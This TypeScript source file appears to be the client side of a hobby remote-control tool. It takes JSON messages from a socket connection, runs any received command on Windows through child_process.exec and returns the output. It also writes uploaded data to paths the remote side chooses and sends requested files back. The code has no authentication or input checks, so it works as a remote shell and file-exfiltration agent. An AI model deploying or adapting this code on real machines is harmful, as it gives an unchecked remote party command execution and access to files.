import { id, target } from "./targetMain"
import {exec} from "child_process"
import * as fs from "fs"
import Encoding from  'encoding-japanese'
import { createSendData } from "./createSendData"

let runCmdList:string[] = []
let oneTimeData:any[] = []
export let startUpload:boolean = false
export let startDownload:boolean = false
let ulFileName:string = ""
let ulFileMax:number = 0
let ulFilePath:string = ""
let ulFileNowSize:number = 0
let nowConnectionClient:string = ""
let nowSize:number = 0

let dlFilePath:string = ""
let sendLsData:any = ""

export const getSendData = async(data:string)=>{
    if(!startUpload && !startDownload){
        const getData = JSON.parse(data)
        if(getData.type === "sendCmd"){
            console.log(getData.data[0])
            const cmdList:string[] = getData.data[0].split(" ")
            let runCmd:string = "chcp 65001  &"
            runCmdList.forEach((i,index)=>{//ここおかしい
                runCmd+=`${i} & `
            })
            runCmd+=`${getData.data[0]}`
            nowConnectionClient = getData.data[1]
            exec(runCmd,{encoding:'utf-8'},(error: any, stdout: any, stderr: any)=>{
                if(!error && !stderr){
                    const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stdout]))
                    target.write(sendData)
                    if(cmdList[0] == "cd"){
                        runCmdList.push(getData.data[0])
                    }
                }else{
                    const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stderr]))
                    target.write(sendData)
                }
            })
        }else if(getData.type === "startUpload"){
            let dirList:string[] = getData.data[2].split("/")
            let dir:string = ""
            let deleteFlg:boolean = false
            dirList.forEach((i,index)=>{
                if(dirList.length>2){
                    if(index != dirList.length-1 && index != 0){
                        dir += `/${i}`
                    }else if(index == 0){
                        dir += i
                    }
                }else{
                    dir = getData.data[2]
                }
                if(i === ''){
                    console.log("dlete")
                    deleteFlg = true
                }
            })
            deleteFlg?dirList = []:deleteFlg = false
            console.log(dir)
            console.log(dirList)
            if(dirList.length>2){
                if(fs.existsSync(dir)){
                    startUpload = true
                    ulFileName = getData.data[0]
                    ulFileMax = getData.data[1]
                    ulFilePath = getData.data[2]
                    nowConnectionClient = getData.data[3]
                    console.log(ulFileMax,ulFileName,ulFilePath,nowConnectionClient)
                    const sendData = JSON.stringify(createSendData("isUploadFile",[dirList[dirList.length-1]]))
                    target.write(sendData)
                }else{
                    console.log("だめです")
                    const sendData = JSON.stringify(createSendData("errorUpload",[]))
                    target.write(sendData)
                }
            }else if (dirList.length == 2){
                startUpload = true
                ulFileName = getData.data[0]
                ulFileMax = getData.data[1]
                ulFilePath = getData.data[2]
                nowConnectionClient = getData.data[3]
                console.log(ulFileMax,ulFileName,ulFilePath,nowConnectionClient)
                const sendData = JSON.stringify(createSendData("isUploadFile",[dirList[dirList.length-1]]))
                target.write(sendData)
            }else{
                console.log("だめです")
                const sendData = JSON.stringify(createSendData("errorUpload",[]))
                target.write(sendData)
            }
        }else if(getData.type === "startDownload"){
            console.log(getData.data[0])
            startDownload = true
            dlFilePath = getData.data[0]
            uploadServer(dlFilePath)
        }else if(getData.type === "startSendCmdResult"){
            console.log("start cmd")
            const sendData = JSON.stringify(createSendData("cmdResult",[sendLsData]))
            target.write(sendData)
            sendLsData = ""
        }
    }else if(startUpload){
        console.log("start")
        oneTimeData.push(data)
        const can = Buffer.concat(oneTimeData)
        ulFileNowSize = Buffer.concat(oneTimeData).length
        console.log(ulFilePath)
        oneTimeData = []
        await fs.writeFileSync(`${ulFilePath}`,can,{flag:'a'})
        console.log("done")
        if(ulFileMax<=fs.statSync(ulFilePath).size){
            const sendData = JSON.stringify(createSendData("doneUploadTarget",[nowConnectionClient]))
            target.write(sendData)
            oneTimeData = []
            startUpload = false
            ulFileMax = 0
            ulFileName = ""
            ulFilePath = ""
            ulFileNowSize = 0
            nowSize = 0
        }
    }
}
const uploadServer = (path:string)=>{
    try{
        console.log("start server upload")
        const fileSize:number = fs.statSync(path).size
        const sendData = JSON.stringify(createSendData("dlStartFlg",[path,fileSize]))
        target.write(sendData)
        fs.readFile(dlFilePath,(error,data)=>{
            target.write(data)
        })
        oneTimeData = []
        startDownload = false
        ulFileMax = 0
        ulFileName = ""
        ulFilePath = ""
        ulFileNowSize = 0
        nowSize = 0
    }catch(error){
        oneTimeData = []
        startDownload = false
        ulFileMax = 0
        ulFileName = ""
        ulFilePath = ""
        ulFileNowSize = 0
        nowSize = 0
        console.log("error")
        const sendData = JSON.stringify(createSendData("serverUploadError",[]))
        target.write(sendData)
    }
}